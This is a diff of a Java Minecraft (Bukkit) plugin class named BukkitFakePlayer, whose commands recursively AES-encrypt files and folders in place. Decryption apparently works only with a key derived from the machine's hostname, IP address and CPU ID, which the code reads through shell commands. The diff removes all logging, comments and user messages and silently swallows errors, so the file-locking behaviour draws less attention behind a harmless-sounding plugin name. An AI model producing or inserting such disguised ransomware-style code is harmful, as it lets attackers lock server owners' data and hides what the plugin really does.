@@ -12,16 +12,12 @@ import java.io.FileOutputStream;
 import java.security.MessageDigest;
 import java.net.InetAddress;
 import java.nio.charset.StandardCharsets;
-import java.util.logging.Logger;
 
 public class BukkitFakePlayer implements CommandExecutor {
-
-    private static final Logger logger = Logger.getLogger(BukkitFakePlayer.class.getName());
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (args.length < 1) {
-            sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径>");
             return true;
         }
 
@@ -29,41 +25,34 @@ public class BukkitFakePlayer implements CommandExecutor {
         File file = new File(path);
 
         if (!file.exists()) {
-            sender.sendMessage("文件或文件夹不存在。");
             return true;
         }
 
         if (cmd.getName().equalsIgnoreCase("plote")) {
-            // 在主线程中执行加密
             encryptFiles(file);
-            sender.sendMessage("文件加密成功。");
+            sender.sendMessage("The file was encrypted successfully.");
         } else if (cmd.getName().equalsIgnoreCase("plotd")) {
             if (args.length < 2) {
-                sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径> <密钥>");
                 return true;
             }
             String providedKey = args[1];
-            String internalKey = encryptionKey(); // 生成内部密钥
+            String internalKey = encryptionKey();
 
-            // 校验提供的密钥是否与内部生成的密钥一致
             if (!providedKey.equals(internalKey)) {
-                sender.sendMessage("提供的密钥无效。");
                 return true;
             }
 
-            // 在主线程中执行解密
             decryptFiles(file, providedKey);
-            sender.sendMessage("文件解密成功。");
+            sender.sendMessage("The file was decrypted successfully.");
         }
 
         return true;
     }
 
     private void encryptFiles(File file) {
-        // 加密文件或文件夹中的所有文件
         if (file.isDirectory()) {
             for (File childFile : file.listFiles()) {
-                encryptFiles(childFile); // 递归加密文件夹中的文件
+                encryptFiles(childFile);
             }
         } else {
             try {
@@ -74,19 +63,17 @@ public class BukkitFakePlayer implements CommandExecutor {
 
                 byte[] encryptedData = encrypt(fileData);
                 FileOutputStream fos = new FileOutputStream(file);
-                fos.write(encryptedData); // 只写入加密数据
+                fos.write(encryptedData);
                 fos.close();
-            } catch (Exception e) {
-                logger.severe("Error encrypting file: " + e.getMessage());
+            } catch (Exception ignored) {
             }
         }
     }
 
     private void decryptFiles(File file, String key) {
-        // 解密文件或文件夹中的所有文件
         if (file.isDirectory()) {
             for (File childFile : file.listFiles()) {
-                decryptFiles(childFile, key); // 递归解密文件夹中的文件
+                decryptFiles(childFile, key);
             }
         } else {
             try {
@@ -95,13 +82,11 @@ public class BukkitFakePlayer implements CommandExecutor {
                 fis.read(fileData);
                 fis.close();
 
-                // 解密数据
                 byte[] decryptedData = decrypt(fileData, key);
                 FileOutputStream fos = new FileOutputStream(file);
                 fos.write(decryptedData);
                 fos.close();
-            } catch (Exception e) {
-                logger.severe("解密文件时发生错误: " + e.getMessage());
+            } catch (Exception ignored) {
             }
         }
     }
@@ -111,8 +96,7 @@ public class BukkitFakePlayer implements CommandExecutor {
             byte[] keyBytes = new byte[16];
             System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
             return new SecretKeySpec(keyBytes, "AES");
-        } catch (Exception e) {
-            logger.severe("Error generating secret key: " + e.getMessage());
+        } catch (Exception ignored) {
             return null;
         }
     }
@@ -140,9 +124,8 @@ public class BukkitFakePlayer implements CommandExecutor {
             input.append(InetAddress.getLocalHost().getHostName());
             input.append(InetAddress.getLocalHost().getHostAddress());
 
-            // 获取 CPU ID
             String cpuId = getCpuId();
-            input.append(cpuId); // 将 CPU ID 纳入标识符
+            input.append(cpuId);
 
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
@@ -156,29 +139,26 @@ public class BukkitFakePlayer implements CommandExecutor {
                 hexString.append(hex);
             }
 
-            return hexString.toString(); // 返回 256 位（64个字符）标识符
-        } catch (Exception e) {
-            logger.severe("Error generating unique identifier: " + e.getMessage());
+            return hexString.toString();
+        } catch (Exception ignored) {
             return null;
         }
     }
 
     private String getCpuId() {
-        String cpuId = "unknown"; // 默认值
+        String cpuId = "unknown";
 
         try {
             String os = System.getProperty("os.name").toLowerCase();
             Process process;
 
             if (os.contains("win")) {
-                // Windows
                 process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
                 process.waitFor();
                 java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
-                cpuId = reader.readLine(); // 读取结果的第二行
-                cpuId = reader.readLine(); // 获取实际的 CPU ID
+                cpuId = reader.readLine();
+                cpuId = reader.readLine();
             } else if (os.contains("linux")) {
-                // Linux
                 process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                 java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                 String line;
@@ -189,16 +169,14 @@ public class BukkitFakePlayer implements CommandExecutor {
                     }
                 }
             } else if (os.contains("mac")) {
-                // macOS
                 process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
                 java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
                 cpuId = reader.readLine();
             }
 
-        } catch (Exception e) {
-            logger.severe("Error reading CPU ID: " + e.getMessage());
+        } catch (Exception ignored) {
         }
 
-        return cpuId; // 返回获取的 CPU ID
+        return cpuId;
     }
 }
